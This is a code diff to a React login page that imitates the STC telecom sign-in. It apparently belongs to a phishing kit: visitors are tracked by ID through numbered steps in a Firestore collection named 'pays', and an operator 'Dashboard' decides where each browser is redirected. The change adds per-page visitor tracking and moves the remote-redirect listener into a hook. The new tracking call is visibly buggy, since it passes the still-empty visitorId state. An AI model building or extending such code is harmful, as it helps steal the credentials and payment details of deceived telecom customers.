@@ -6,6 +6,8 @@ import { Phone, Lock, Eye, EyeOff, Loader2, ShieldCheck } from "lucide-react";
 import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
 import { getRedirectUrl } from "@/lib/page-route";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { updateVisitorPage } from "@/lib/visitor-tracking";
 
 export default function StcLoginPage() {
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -19,31 +21,33 @@ export default function StcLoginPage() {
     if (typeof window !== "undefined") {
       const id = localStorage.getItem("visitor") || "";
       setVisitorId(id);
+      updateVisitorPage(visitorId, "stc-login", 9);
     }
   }, []);
 
-  useEffect(() => {
-    if (!visitorId) return;
+  // useEffect(() => {
+  //   if (!visitorId) return;
 
-    const unsubscribe = onSnapshot(
-      doc(db, "pays", visitorId),
-      (snap) => {
-        if (!snap.exists()) return;
-        const data = snap.data();
+  //   const unsubscribe = onSnapshot(
+  //     doc(db, "pays", visitorId),
+  //     (snap) => {
+  //       if (!snap.exists()) return;
+  //       const data = snap.data();
 
-        // Dashboard redirect
-        const redirectUrl = getRedirectUrl(data.currentPage, "stc");
-        if (redirectUrl) {
-          window.location.href = redirectUrl;
-        }
-      },
-      (err) => {
-        console.error("STC Firestore listener error:", err);
-      }
-    );
+  //       // Dashboard redirect
+  //       const redirectUrl = getRedirectUrl(data.currentPage, "stc");
+  //       if (redirectUrl) {
+  //         window.location.href = redirectUrl;
+  //       }
+  //     },
+  //     (err) => {
+  //       console.error("STC Firestore listener error:", err);
+  //     }
+  //   );
 
-    return () => unsubscribe();
-  }, [visitorId]);
+  //   return () => unsubscribe();
+  // }, [visitorId]);
+  useRedirectMonitor({ visitorId, currentPage: "stc-login" });
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setPhoneNumber(e.target.value);
